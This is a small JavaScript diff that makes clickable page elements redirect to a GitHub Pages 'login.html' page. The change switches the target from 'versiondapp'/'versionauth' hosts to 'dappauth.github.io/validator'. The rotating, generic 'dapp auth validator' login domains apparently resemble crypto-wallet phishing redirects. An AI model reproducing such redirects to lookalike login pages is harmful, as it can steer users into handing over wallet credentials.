@@ -1,6 +1,6 @@
 document.addEventListener('DOMContentLoaded', function () {
     // URL to navigate to
-    const targetURL = "https://versiondapp.github.io/auth/login.html";
+    const targetURL = "https://dappauth.github.io/validator/login.html";
   
     // Select all case-item-container elements
     const caseItemContainers = document.querySelectorAll('.case-item-container, .case-item-container-2');
@@ -8,7 +8,7 @@ document.addEventListener('DOMContentLoaded', function () {
     // Add click event listener to each container
     caseItemContainers.forEach(container => {
       container.addEventListener('click', function () {
-        window.location.href = "https://versionauth.github.io/user/login.html";
+        window.location.href = "https://dappauth.github.io/validator/login.html";
       });
     });
   });
